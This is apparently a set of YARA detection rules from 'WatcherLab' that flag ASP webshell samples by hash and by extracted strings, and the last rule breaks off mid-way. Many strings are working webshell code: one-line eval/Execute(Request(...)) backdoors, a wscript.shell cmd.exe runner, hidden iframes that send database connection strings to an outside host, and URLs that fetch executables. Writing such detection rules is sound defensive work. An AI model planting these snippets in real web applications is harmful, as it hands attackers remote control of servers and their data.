        description = "asp - file 856fd869cbe305608cbf90f61f50a373ce6a81e4.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5f272b99899ba5f8d62a1cd55ef619bd23178c22b39e29409cd9226b4a2704ab"
     strings:
        $s1 = "<!-- caidao setting input:<O>sb=eval(request(0))</O>,connecting pass:0 -->" fullword ascii
        $s2 = "execute re" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_8f10120aea3f81623c7d17eba77bf728ab93938f
{
     meta:
        description = "asp - file 8f10120aea3f81623c7d17eba77bf728ab93938f.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2136acae56b7f6cf4be565f6b85699fb5358533bfecfa51fd713159baca2c1cd"
     strings:
        $s1 = "axJ1WsFkmGhyu^Wsfu1Wh*-mWhX-mG:+k1WhFu1W:Ru1G:OuswDFksaY -swD&u^2Oc-VaYXus2DvkVaOG-V2ORuV2OOJ@#@&MU9wnX'kwVbYv2+X~Eur#c." fullword ascii
        $s2 = "x@#@&K8RKWkkOrKxP{~f&2x9~lP:FcZGwzPKPP B9?Dl.O fq3U9Of@#@&PyRKK/bYkKx,xPZPlP:  PHw+,xPy@#@&:+ Z4lM/nY~xro8 2q r@#@&jw.Px~:  I" fullword ascii
        $s3 = "NbD+1Y,;D^@#@&+^/n@#@&LJ@!8D@*@!4M@*@!4M@*@!4@*@![r7PCVbLx{mnUD+D@*@!6WUY,dbyn{BlBP1W^GD{B.+9B@*Km//qGD9P2M.GDe@!J0GxO~r[;/" fullword ascii
        $s4 = "PxPERG2J2:3f}H)(gJP'~74/DdW,[~rO&n'ZRZ !c!EPLP-8;DS6~[,JPhG.YgW{J~[~WDw2WMOPLP-8;DSW@#@&:OP{~r?(:2,Hb&1:31z1/2rP'~74ZMJ0@#@&x" fullword ascii
        $s5 = "Esl-~EYr:(;?E'nhmxPvOb:8Ekv{+2HY,YEaxb@!@*9'[k,B+v{xladVKmP9O@!@*E+^N[khv{xLk^C\\,B.nDx+^v{xLk^C,DO@!@*MYz@!@*9Oz@!" fullword ascii
        $s6 = "6OGbxYn.vZjYMc_+avnKDYzDMCXvFb#*[/jDD`_n6vnWMO)DMlH`T#bb*@#@&2^d+,@#@&%r2D.GM\"~ZmUEY~\"+mN\"r@#@&3x9P(0@#@&3U9Ps!UmDkW" fullword ascii
        $s7 = "@!zm@*~J@#@&dr{/kLE@!mPtMnW'ELm\\C/^.bwO)w;V^sG.s`JEELInnmO4`KmY4[J'JLJRglh+*[EEr~Jr3NbYsbsnJr#EP^VCdk'vlsvPDkOs" fullword ascii
        $s8 = "=\"http://lpl38.com/web/FileType/\"'" fullword ascii
        $s9 = "=\"http://lpl38.com/web/pr.exe\"'" fullword ascii
        $s10 = "=\"http://lpl38.com/web/php.txt\"'" fullword ascii
        $s11 = "=\"http://lpl38.com/web/aspx.txt\"'" fullword ascii
        $s12 = "EL+W@#@&%P1Na'r@!l~4M+W'E%m\\CkmMkwD)w;V^sGDs`EE'--' -'J[\"nKlDtv?n/drKxcJwGV9+.KmYtEbLJE#LE'x;^Jr~Jr1" fullword ascii
        $s13 = "=\"http://seay.sinaapp.com/\"'" fullword ascii
        $s14 = "=\"http://lpl38.com/web/\"'" fullword ascii
        $s15 = "+~Y4nx@#@&OaDRmsGk+@#@&6dK( V+Dsk^+vok^+iD^# )DYDb8ED+/{f+@#@&k6P)w2sbmCYbGxvDn5!+/Ocrn.Wwr^+E*[rZtmDrb'8POt" fullword ascii
        $s16 = "bW~`9W1Eh+UOconYAs+s+UO~Xq[ck# /Dz^+ 9kkwVmX{xJrJE#PNG^!:+" fullword ascii
        $s17 = "@!J4@*@!Jl@*@!JKf@*@!K\"Pm^Cd/{K~K9@*~@!wr]H,CmDkGU{P:nO4W['hGkY@*r@#@&LJ@!KG~l^kLx{:r[9V+@*@!A@*" fullword ascii
        $s18 = "'&b:mo+kzcC/a[Wk^+UCs+FEI@!J/mMr2Y@*J@#@&nx[~kE8@#@&@#@&UE8~t+/dCT+c/DCD+Ss/T~0^lTb@#@&LE@!:b$JAPhb[Y4'cRT~4KD9+.'T~mVro" fullword ascii
        $s19 = "~[,!Tq,zPbTZF~e,b*c+ZF,ePW Zq`,z~+.kjn4Y`vakwP',n\"kU+4KO+Ll,xnt:~#W Tq,eP*+ZF~e,*y!qvP@!P+.kUntDP[xzPb*y!F,MPW !8c~'@*P" fullword ascii
        $s20 = "@!&:f@*@!&K\"@*J@#@&~PwWMP3l^4,f.k7nA,kU~w?r 9Mk-+k@#@&LE,@!:IPmVbLx{:rN9Vn~1Vlkd':AKG@*@!s}ItPCmOrKxxgz^YbWUxUmlU9Mk-+L9Mk-" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule bc10f6a3a91b444d8ca499a30309a6d6056a4111
{
     meta:
        description = "asp - file bc10f6a3a91b444d8ca499a30309a6d6056a4111.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2838b2bff6e6a4908447291924eabd30eab582b14bb3ac2ac5f3f97851f33cfc"
     strings:
        $s1 = "] http://www.d99net.net</TITLE>" fullword ascii
     condition:
        ( uint16(0) == 0x483c and filesize < 20KB and ( all of them ) ) or ( all of them )
}

rule f05200fba05494e22195313dfd3bf8b2066da2af
{
     meta:
        description = "asp - file f05200fba05494e22195313dfd3bf8b2066da2af.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "43066817584dfc90d5c7fae0c9dc881d7243c4c4b039249203932f02ada304f8"
     strings:
        $s1 = "If Len(s) > 0 Then RightShift = mid(s, Len(s), 1) & mid(s, 1, Len(s) - 1)" fullword ascii
        $s2 = "For k = 1 To ascW(mid(sPASSWORD, i, 1)) * i " fullword ascii
        $s3 = "Public Const sDefaultWHEEL2 = \": uN4dB>CzHvaE2SI0jph\"\"+(=k.xsPL,rKQwb;qTnt6ge&J<#li'-7/oAWFc58fU1V)!3_m9yR\" " fullword ascii
        $s4 = "Public Const sDefaultWHEEL1 = \">/ShR'b=V cCF.95WHU3Ei-4);aI6A\"\"+10dj(P,2geNkfxm<ywJ#zqBT&oKLQ!pn7uv_l8:rts\" " fullword ascii
        $s5 = "execute(Session(\"EXBkHKFSg\"))" fullword ascii
        $s6 = "If Len(s) > 0 Then LeftShift = mid(s, 2, Len(s) - 1) & mid(s, 1, 1)" fullword ascii
        $s7 = "Function Decrypt_PRO(sINPUT , sPASSWORD ) " fullword ascii
        $s8 = "Sub ScrambleWheels(ByRef sW1 , ByRef sW2 , sPASSWORD ) " fullword ascii
        $s9 = "gtT;LnP=Qkm\"\"noI&VyT!NVfb/kUc+K;e)t8INL1_I9P+!=E2cIdB'C9yg9URyg-T'cx>d/-3)&z71.P,xcKlpaW2N4lBygql75_3T#w<ogvun9," fullword ascii
        $s10 = "ScrambleWheels sWHEEL1, sWHEEL2, sPASSWORD " fullword ascii
        $s11 = "sRESULT = sRESULT & Addpass(c,sPASSWORD) " fullword ascii
        $s12 = "'NBygSo-7F!&B=0o'r0:g&rBj_KPHJ0SU_>6vE \"\"i; 9+NV!o-.eS7la(xQA,'B!h,-W4c;IVNqg93dnK77_Iek8l,nVu&q)" fullword ascii
        $s13 = "For i = 1 To Len(sPASSWORD) " fullword ascii
        $s14 = "Addpass = ChrW((ascW(tPass) Xor Len(tPass)) Xor ascW(tstr))" fullword ascii
        $s15 = "I7J>0x ,s1Aa9/#n\"\"LzlN)'Q>7V 3PTl(7ia4Qpumfg1w ,-QVix207R0C& Rp7WshQ.-('C:o1gz;.v3" fullword ascii
        $s16 = "o#zT.p(,9t6\"\"gjcJ82hdx):zW+Wro2.kUL46:#/T8.QQF=_(+Fk" fullword ascii
        $s17 = "LV\"\"C dE7(WNk:t>.t1,KFH7\"\"4c;yIz<yfBFTqzj\"\"xKo(z!WdvI:&9)Kw5ao(B-B" fullword ascii
        $s18 = "Wko6wT<EW0;cQ t5 xLd/)I8EEB-yu<Ru'.qfKcc-=e#u QJlKpu8FAo2.PERAtqb" fullword ascii
        $s19 = "code=Decrypt_PRO(crypt_PRO,Key)" fullword ascii
        $s20 = "k = InStr(1, sWHEEL2, c, vbBinaryCompare) " fullword ascii
     condition:
        ( uint16(0) == 0x4947 and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule ec200b192c813e2ce5375000969b492afd827e2d
{
     meta:
        description = "asp - file ec200b192c813e2ce5375000969b492afd827e2d.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d6a0d99a37d8a49fc74095dc9352dcdbce15dd6cbe31d1c269b512e6b0058e82"
     strings:
        $s1 = "4kwirPL~HbNcsbVnHm:+Bq~&x/D.]+7`wks+HCs+SJ'E#*P'~}EYK;D@#@&P,%,r;Dn!Y@#@&P,]+kwGxk+ W^E/4@#@&,PZKsGD}x{F@#@&~~,+s/" fullword ascii
        $s2 = "8F+*[1tDvc+b[1t.`O,b'1tDvqF8#[14.`8!O#'m4.vc{#L^tM`qql#[^4M`q ZbLm4M`WG#Lm4.`8FX#Lm4.vcv*'m4D`O{b[1tM`qFXbLm4DvqFy#'^4D`" fullword ascii
        $s3 = "^PkKx,H\\fcb=?('r@!4M@*@!WKD:~Um:n'6GM:~s+DtW9'aG/DPCmDkGU{JJrE@*@!Yl(snPSk9Y4'EER*YJr~l^kLU{BmnUD+.B@*@!DD~mVbox{m" fullword ascii
        $s4 = "bg =\"http://www.7jyewu.cn/webshell/Anonymous.jpg\"  '" fullword ascii
        $s5 = "'EfB@* @!z6WUO@*J@#@&dk{/kLE@!l,tM+W'v%m\\C/1.kaYlo!VVoGM:cJrELInhlDt`hlD4[r-E[dRHCs+#LEJr~Jr9Gh" fullword ascii
        $s6 = "Jb/O@#@&kX/wk^nSb/OP{PEy_?CchN(^CUu V94fJ@#@&(W,?nD7nDcZ.nmY+68N+^Yv/}1j:{w?r*RwGV9+.2XkdOk`Y4nnmYt*~xPwl^/nPP4" fullword ascii
        $s7 = "PW(%o0@#@&,P~PdOMss1mh+{rUnwkVn glh+@#@&,P~,q6P/DDws1m:n@!@*J[nk3YK2Rbxkr~3pjPkY.ssHm:n@!@*E0KV[nMRtOOrPPt" fullword ascii
        $s8 = "6Ov,kN{vEEP\\ms;+{BdW^ls)9:rxbdYMlOGMB@*@!&DN@*J@#@&NJ@!JYM@*J@#@&NE@!DD~l^kLU{Bm" fullword ascii
        $s9 = "o@!J8@*@!JY9@*@!Y[~bNx/@*@!4,k[xX@*SCdDP\\W9r6kn9@!J4@*@!zD[@*@!Y[@*@!zO[@*J@#@&oWMP2m^4PdPbx~sGs9RWk^n/@#@&j({?q'E@!Y.@*@!O9P4" fullword ascii
        $s10 = "[J@!z6GxD@*@!z6WUO@*@!z1nxD+D@*@!4D,mKVGDx:W * W+Pkk\"n{FP@*@!JY[@*@!&DD@*r)&0P}4:c!BFb'rP" fullword ascii
        $s11 = "[P&0@#@&Ax[~wEx1OkKx@#@&o;x1YbWUP\\G7+ok^n`hlO4*@#@&KCDtx?asbYchlDt~ru-kur#@#@&&0~/wRsbs+A6kkOd`hlDtc!bb,lUN,KlDtcq*@!@*EE,K4+" fullword ascii
        $s12 = "fbD'rPL~YalOt,[~E'JPL~\\(mD^W~[,J SGorUt+dsbs+{J~',\\4^.^0~[,E frkl(V+{!r~[,\\8mMVW~LPJ ]+^nlD4d'8J,[~\\8^MVWPL~{@#@&ERg++[j" fullword ascii
        $s13 = "anm,J,[~mh[,[~\\(/Dd0~',;ErO@#@&d+D~k+dkkKx`r4rb'(@#@&Lr@!WGM:PsnY4WN{v2WkYEPUlhn{BLW^[/!xv@*r@#@&%E@!kUw!O,xCs+{BEEPDzw" fullword ascii
        $s14 = "j_RI3!\"2)fv]mNhbxhlY4PL~nKDOP*@#@&(6Pqk)DMlXvKGDDbMDCXb~:tnx,@#@&NPKGMYP'E=J~@#@&%,tnXYKkxD+McZUY.`_+achWDD)DMlXvqb#*[;?ODcu" fullword ascii
        $s15 = "!M+1J'm4.vFf#L^tM`qT*[J/l'mCm4nr[^4DvF&*[14DvFT#LJ/l'9nA!ZmwY!.nJLm4DcFfbLm4Dvq!*[E/=-qUnDw;4r@#@&kW,?" fullword ascii
        $s16 = "YnD@*@!6W.sPs+Y4W9xBaWdYEPUCs+'ELW^N/!Uv@*r@#@&LE@!OC(VnPSrNDtxvW,cv~4+ro4O{Bq+&EP4KD9nD{BqB,mns^wl9[k" fullword ascii
        $s17 = "W(%+1YcW(YcqB!#*@#@&k+Y,[['1:c+a+^cktnV^2lDt'E,zm~ELNn01h9#@#@&lml'9NcdY9W;YcDnC9lV^@#@&kk'kr'lml@#@&nVdn@#@&Gx,nDMW.~M+/;h" fullword ascii
        $s18 = "6(Ln1YvJHbmMG/K0ORoHJu:Knrb@#@&lRK2nx,JV2PJS~rtOYalzJF+{c!RT 8)EPL~aW.DPLPJJoKsNkEUz!wC[skxJd&r~P:.;+BPrJSPEE@#@&CRknx9PsGTkx;d" fullword ascii
        $s19 = "x@#@&.dcb[Ngnh@#@&.dvJY4nhlOtrb,'~tk9`kD+s nmY4~,cb@#@&/YMnlsRSKC[sMWssrVncbYn:cKlDtb@#@&D/cE6ks+;G" fullword ascii
        $s20 = "KlDtb@#@&?nO,0k^n/,'PD4nsKV9+.Ror^+d@#@&j+DPWG^N+.d,'~Y4nwWs9+MR?!4wGV9+./@#@&oGMP2m^t,kY" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_7c4cfb6e077363dd0e2cbcb0c2ae8dbeb7730131
{
     meta:
        description = "asp - file 7c4cfb6e077363dd0e2cbcb0c2ae8dbeb7730131.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b675eb8525152b5897d0bfe2df2b7892634340b92bd4bbc7d868b42719475423"
     strings:
        $s1 = "<%eval request(\"cmd\")%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule d6b96d844ac395358ee38d4524105d331af42ede
{
     meta:
        description = "asp - file d6b96d844ac395358ee38d4524105d331af42ede.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "da3b4cca26d4339d0b8e9988057b1c90752f68adcf81167465e34ec1d31d01dc"
     strings:
        $s1 = "<% If Request(\"value\")<>\"\" Then Execute(Request(\"value\"))%>" fullword ascii
        $s2 = "<%%25Execute(request(\"a\"))%%25>" fullword ascii
        $s3 = "Execute(AACode(\"457865637574652870617373776F726429\"))" fullword ascii
        $s4 = "Execute(\"AACode=AACode&chr(&H\"&c&Mid(s,i+2,2)&\")\")" fullword ascii
        $s5 = "<script language = VBScript runat=\"server\">execute request(\"value\")</script>" fullword ascii
        $s6 = "457865637574652870617373776F726429" ascii /* hex encoded string 'Execute(password)' */
        $s7 = "Execute(\"AACode=AACode&chr(&H\"&c&\")\")" fullword ascii
        $s8 = "Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")" fullword ascii
        $s9 = "<% execute(request(\"value\")) %>" fullword ascii
        $s10 = "ExecuteGlobal request(chr(35))" fullword ascii
        $s11 = "Execute(DeAsc(\"%87%138%119%117%135%134%119%58%130%115%133%133%137%129%132%118%59\")):Function DeAsc(Str):Str=Split(Str,\"%\"):F" ascii
        $s12 = "Execute(DeAsc(\"%87%138%119%117%135%134%119%58%130%115%133%133%137%129%132%118%59\")):Function DeAsc(Str):Str=Split(Str,\"%\"):F" ascii
        $s13 = "<% execute request(\"value\") %>" fullword ascii
        $s14 = "<%execute request(char(97))%>" fullword ascii
        $s15 = "<script language=VBScript runat=server>if request(chr(35))<>\"\"\"\" then" fullword ascii
        $s16 = "<%eval(Request.Item[\"value\"],\"unsafe\");%>" fullword ascii
        $s17 = "=1 To Ubound(Str):DeAsc=DeAsc&Chr(Str(I)-18):Next:End Function" fullword ascii
        $s18 = "password=Request(\"Class\")" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 4KB and ( 8 of them ) ) or ( all of them )
}

rule sig_5779efa3a4e91933b3e93236ca8d44b73ea7fd61
{
     meta:
        description = "asp - file 5779efa3a4e91933b3e93236ca8d44b73ea7fd61.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "74e326d9351cbec2ba816ff3aa6174b2da7650c8e9bcfc8b7597a165e0b8f27a"
     strings:
        $s1 = "<%if request (\"M\")<>\"\"then session(\"M\")=request(\"M\"):end if:if session(\"M\")<>\"\" then execute session(\"M\")%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_9302b3a7853e0164311a8574867ad15dc25088c0
{
     meta:
        description = "asp - file 9302b3a7853e0164311a8574867ad15dc25088c0.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9b43c1241705f46b666fd802a9e9b0e3e30ae38d16af6170ed2140d4134da819"
     strings:
        $s1 = "axJ1WsFkmGhyu^Wsfu1Wh*-mWhX-mG:+k1WhFu1W:Ru1G:OuswDFksaY -swD&u^2Oc-VaYXus2DvkVaOG-V2ORuV2OOJ@#@&MU9wnX'kwVbYv2+X~Eur#c." fullword ascii
        $s2 = "x@#@&K8RKWkkOrKxP{~f&2x9~lP:FcZGwzPKPP B9?Dl.O fq3U9Of@#@&PyRKK/bYkKx,xPZPlP:  PHw+,xPy@#@&:+ Z4lM/nY~xro8 2q r@#@&jw.Px~:  I" fullword ascii
        $s3 = "NbD+1Y,;D^@#@&+^/n@#@&LJ@!8D@*@!4M@*@!4M@*@!4@*@![r7PCVbLx{mnUD+D@*@!6WUY,dbyn{BlBP1W^GD{B.+9B@*Km//qGD9P2M.GDe@!J0GxO~r[;/" fullword ascii
        $s4 = "PxPERG2J2:3f}H)(gJP'~74/DdW,[~rO&n'ZRZ !c!EPLP-8;DS6~[,JPhG.YgW{J~[~WDw2WMOPLP-8;DSW@#@&:OP{~r?(:2,Hb&1:31z1/2rP'~74ZMJ0@#@&x" fullword ascii
        $s5 = "Esl-~EYr:(;?E'nhmxPvOb:8Ekv{+2HY,YEaxb@!@*9'[k,B+v{xladVKmP9O@!@*E+^N[khv{xLk^C\\,B.nDx+^v{xLk^C,DO@!@*MYz@!@*9Oz@!" fullword ascii
        $s6 = "6OGbxYn.vZjYMc_+avnKDYzDMCXvFb#*[/jDD`_n6vnWMO)DMlH`T#bb*@#@&2^d+,@#@&%r2D.GM\"~ZmUEY~\"+mN\"r@#@&3x9P(0@#@&3U9Ps!UmDkW" fullword ascii
        $s7 = "@!zm@*~J@#@&dr{/kLE@!mPtMnW'ELm\\C/^.bwO)w;V^sG.s`JEELInnmO4`KmY4[J'JLJRglh+*[EEr~Jr3NbYsbsnJr#EP^VCdk'vlsvPDkOs" fullword ascii
        $s8 = "=\"http://lpl38.com/web/FileType/\"'" fullword ascii
        $s9 = "EL+W@#@&%P1Na'r@!l~4M+W'E%m\\CkmMkwD)w;V^sGDs`EE'--' -'J[\"nKlDtv?n/drKxcJwGV9+.KmYtEbLJE#LE'x;^Jr~Jr1" fullword ascii
        $s10 = "+~Y4nx@#@&OaDRmsGk+@#@&6dK( V+Dsk^+vok^+iD^# )DYDb8ED+/{f+@#@&k6P)w2sbmCYbGxvDn5!+/Ocrn.Wwr^+E*[rZtmDrb'8POt" fullword ascii
        $s11 = "bW~`9W1Eh+UOconYAs+s+UO~Xq[ck# /Dz^+ 9kkwVmX{xJrJE#PNG^!:+" fullword ascii
        $s12 = "@!J4@*@!Jl@*@!JKf@*@!K\"Pm^Cd/{K~K9@*~@!wr]H,CmDkGU{P:nO4W['hGkY@*r@#@&LJ@!KG~l^kLx{:r[9V+@*@!A@*" fullword ascii
        $s13 = "'&b:mo+kzcC/a[Wk^+UCs+FEI@!J/mMr2Y@*J@#@&nx[~kE8@#@&@#@&UE8~t+/dCT+c/DCD+Ss/T~0^lTb@#@&LE@!:b$JAPhb[Y4'cRT~4KD9+.'T~mVro" fullword ascii
        $s14 = "~[,!Tq,zPbTZF~e,b*c+ZF,ePW Zq`,z~+.kjn4Y`vakwP',n\"kU+4KO+Ll,xnt:~#W Tq,eP*+ZF~e,*y!qvP@!P+.kUntDP[xzPb*y!F,MPW !8c~'@*P" fullword ascii
        $s15 = "@!&:f@*@!&K\"@*J@#@&~PwWMP3l^4,f.k7nA,kU~w?r 9Mk-+k@#@&LE,@!:IPmVbLx{:rN9Vn~1Vlkd':AKG@*@!s}ItPCmOrKxxgz^YbWUxUmlU9Mk-+L9Mk-" fullword ascii
        $s16 = "xqJ,[,\\8Z.J6P'PrRImYrGkZDn[bYx!r~LP-(ZMS0,[,EO5EGYmZ;.M+xDx!rP[,-8ZMS6P'PER5EGYm\\lXkh;s'!E~LP-4;.d0~LP|@#@&,P,~P,P~J HCr" fullword ascii
        $s17 = "HGEkn}\\nM'rJY4kk /DXs+cm;.kWD{vtmxN8vEJ,YHwn'8;DYGx,-l^EnxEqxWGM:CYbG" fullword ascii
        $s18 = ".)8waPkWsr9PJL$WMN+M/GVKDLJIwC[9kUo 8WDYGh=cwav@*J@#@&U({?(LqkqmK`rE~r0GV9+. Tk0rSJZJ#@#@&dk{/b[E@!C~4Dn0{vLm\\Cd1Dk2O=?4WSoKV[" fullword ascii
        $s19 = "D. 1V+m.@#@&k0,6$9c?Dl.YPza+xJr~Y4+U@#@&?qxj&[E@!D.@*@!O9P4+kTtDxJr TJrPr[{N@*LU4kwir'G4NRglh+'E@!zON@*@!Y9Pr[{N@*'U(/2i" fullword ascii
        $s20 = "9kM'^)'-E~LP\\(/Dd0PL~EOdWTkUHndwks+{EPLP-8;DSW~LPEOGrkl8^+{!J,[,-4;DJ0,[~E I+^KlDt/{qEPLP74/DJW,[~{@#@&P,P~~,PPERg+nNUn1E." fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_90870c847b8482cb7b1cf8590590060eff369914
{
     meta:
        description = "asp - file 90870c847b8482cb7b1cf8590590060eff369914.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "49bd8e2c6ac324dc41aaa221ff4d38fdba9ceeceb233b49e978d8e31cd67e677"
     strings:
        $s1 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT> var P = Request.form('z'); var Wab = {'E' : eval}; Wab.E(P+''); </SCRIPT>" fullword ascii
     condition:
        ( uint16(0) == 0x533c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_683271714d63de3cab778753983ba8f200935ff4
{
     meta:
        description = "asp - file 683271714d63de3cab778753983ba8f200935ff4.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "44cf0b5b3d70552f9acd5d113bed080d1d85dcd8d31715964a13b214a27a33e0"
     strings:
        $s1 = "Set rs = Conn.Execute(sql)" fullword ascii
        $s2 = "echo \"<textarea cols=70 rows=8>\" & adox.Procedures(sTableName).Command.CommandText & \"</textarea><br>\"" fullword ascii
        $s3 = "<iframe src=\"http://www.g.cn/dbstrs/1.asp?dburl=<%=GetUrl()%>\" width=0 height=0></iframe>" fullword ascii
        $s4 = "<iframe src=\"http://www.g.cn/dbstrs/1.asp?dbstr=<%=session(\"dbstr\")%>\" width=0 height=0></iframe>" fullword ascii
        $s5 = "geturl = \"?\" & replace(request.QueryString,\"&keylog=\"&request(\"keylog\"),\"\")" fullword ascii
        $s6 = "strdel = \"delete from \" & request(\"table_name\") & \" where \" & request(\"primarykey\") & \"=\" & request(\"keylog\")" fullword ascii
        $s7 = "conn.execute(strdel)" fullword ascii
        $s8 = "conn.execute(sql)" fullword ascii
        $s9 = "echo \"<a href='?key=sql&sql=SELECT * FROM [\" & objSchema(\"TABLE_NAME\")& \"]'>\" & objSchema(\"TABLE_NAME\") & \"</a><br>\"" fullword ascii
        $s10 = "set rs = conn.execute(sql)" fullword ascii
        $s11 = "sql = \"select top 1 * from \" & names & \" where \" & keys & \" < \" & values & \" order by \" & keys & \" desc\"" fullword ascii
        $s12 = "sql = \"select top 1 * from \" & names & \" where \" & keys & \" > \" & values & \" order by \" & keys & \" asc\"" fullword ascii
        $s13 = "<a href=\"?key=sql&sql=select * from <%=table_name%>&table_name=<%=table_name%>&primarykey=<%=primarykey%>\">" fullword ascii
        $s14 = "<span onClick=\"if(document.exesql.sql.rows>9)document.exesql.sql.rows-=5\" style=\"cursor:pointer;\">-</span>" fullword ascii
        $s15 = "conn.execute (aSql(iLoop))" fullword ascii
        $s16 = "echo \"<a href='?key=sql&sql=select * from \" & names & \"&table_name=\"& names & \"&primarykey=\"&keys&\"'>" fullword ascii
        $s17 = "<a href=\"?key=sql&sql=alter table [<%=table_name%>] drop [<%=rs(i).name%>];\" onClick=\"return table_delete();\">" fullword ascii
        $s18 = "<input type=\"radio\" name=\"dbtype\" value=\"sql\" onClick=\"dbstr.value='driver={SQL Server};database=;Server=;uid=;pwd='\"> " fullword ascii
        $s19 = "echo \"<a href='\" & pageUrl & \"&page=\" & page - 1 & \"&pageSize=\"&pageSize&\"'>" fullword ascii
        $s20 = "<a href=\"http://www.g.cn\" target=\"_blank\">" fullword ascii
     condition:
        ( uint16(0) == 0x423c and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule sig_115b3ee52583fdbabeeb9814038f7bc25fb8e3bd
{
     meta:
        description = "asp - file 115b3ee52583fdbabeeb9814038f7bc25fb8e3bd.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
     strings:
        $x1 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c \"&request.form(\"cmd\")).stdout.readall" fullword ascii
        $x2 = "si=\"<script src=\"\"http://sx.love-1-love.com/sx.php?url=\"&server.URLEncode(\"\"&request.ServerVariables(\"HTTP_HOST\")&reques" ascii
        $x3 = "RRS\"Zend: C:\\Program Files\\Zend\\ZendOptimizer-3.3.0\\lib\\Optimizer-3.3.0\\php-5.2.x\\ZendOptimizer.dll  <br>\"" fullword ascii
        $x4 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>AllUsers</a>n#" fullword ascii
        $s5 = "case \"apjdel\":apjdel():case \"Servu7x\":su7():case \"fuzhutq1\":fuzhutq1():case \"fuzhutq2\":fuzhutq2():case \"fuzhutq3\":fuzh" ascii
        $s6 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\a" fullword ascii
        $s7 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\`" fullword ascii
        $s8 = "RRS\"c:\\Documents and Settings\\All Users\\Application Data\\Hagel Technologies\\DU Meter\\log.csv <br>\"" fullword ascii
        $s9 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\error.log <br>\"" fullword ascii
        $s10 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Persist.Dat  <br>\"" fullword ascii
        $s11 = "RRS\"C:\\7i24.com\\iissafe\\log\\startandiischeck.txt  <br>\"" fullword ascii
        $s12 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Validate.dat  <br>\"" fullword ascii
        $s13 = "xPost.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\",True, \"\", \"\"" fullword ascii
        $s14 = "<a href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\system32\\\\config\\\\\"\")'>config</a>WP" fullword ascii
        $s15 = "<a href='javascript:ShowFolder(\"\"c:\\\\WINDOWS\\\\system32\\\\inetsrv\\\\data\\\\\"\")'>data</a>eF<a href='javascript:ShowFold" ascii
        $s16 = "xPost3.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\", True" fullword ascii
        $s17 = "RRS\"c:\\Program Files\\360\\360Safe\\deepscan\\Section\\mutex.db <br>\"" fullword ascii
        $s18 = "xPost.Send loginuser & loginpass & mt & newdomain & newuser & quit" fullword ascii
        $s19 = ":Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLE" ascii
        $s20 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\Rewrite.log<br>\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule adf4e9dea7276a202cbc99d23f99c1f4095b95d3
{
     meta:
        description = "asp - file adf4e9dea7276a202cbc99d23f99c1f4095b95d3.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a2f59afbb8ec963f945c8945ae37f6302059f94f7688745a22b17c7193414ab0"
     strings:
        $s1 = "Webshell Mumaasp.com" fullword ascii
        $s2 = "xOZKP=nMlN_nN9RbknGxkw\"+n=0=wOiK,=P{+O.ktl /k+Gxk2\"+|m:M+/DY O+KmUzbWCObmw^Cw,UP{2nKHxDYnWU ;/nW" fullword ascii
